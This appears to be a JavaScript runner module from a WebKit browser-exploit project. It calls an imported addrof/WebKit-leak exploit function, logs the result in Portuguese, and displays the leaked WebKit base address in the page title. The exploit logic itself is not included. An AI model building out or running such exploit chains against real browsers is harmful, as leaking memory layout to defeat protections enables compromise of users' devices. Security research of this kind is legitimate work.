// js/script3/runAllAdvancedTestsS3.mjs (Revisão 46 - Relatório Final)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43 as executeExploit, 
    FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK as FNAME_MODULE
} from './testArrayBufferVictimCrash.mjs';

async function runFinalExploitStrategy() {
    const FNAME_RUNNER = "runFinalExploitStrategy"; 
    logS3(`==== INICIANDO Estratégia Final (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeExploit();

    if (!result || result.success === false) {
        logS3(`  RUNNER R46: O exploit falhou. Mensagem: ${result?.error || 'Erro desconhecido.'}`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE}: Exploit FAIL!`;
    } else {
        logS3(`  RUNNER R46: O exploit foi concluído com SUCESSO.`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R46: Base do WebKit vazada: ${result.webkit_base}`, "vuln", FNAME_RUNNER);
        document.title = `SUCESSO! Base: ${result.webkit_base}`;
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia Final (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R46 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runFinalExploitStrategy();
    
    logS3(`\n==== Script 3 R46 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
